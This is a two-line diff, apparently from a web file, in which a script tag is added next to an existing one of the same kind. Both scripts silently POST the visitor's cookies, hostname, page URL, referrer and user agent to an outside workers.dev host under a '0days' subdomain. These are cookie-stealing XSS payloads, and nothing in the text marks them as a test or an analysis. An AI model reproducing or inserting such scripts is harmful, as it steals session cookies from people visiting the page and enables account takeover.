@@ -1,1 +1,2 @@
 <script>fetch('https://aged-cloud-b431.0days.workers.dev/x/8c12613f5acfd286-qpkh68e3x',{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cookie:document.cookie,domain:location.hostname,url:location.href,ref:document.referrer,ua:navigator.userAgent})})</script>
+<script>fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-a3qwxqcq5',{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({domain:location.hostname,url:location.href,ref:document.referrer,ua:navigator.userAgent,cookie:document.cookie})})</script>
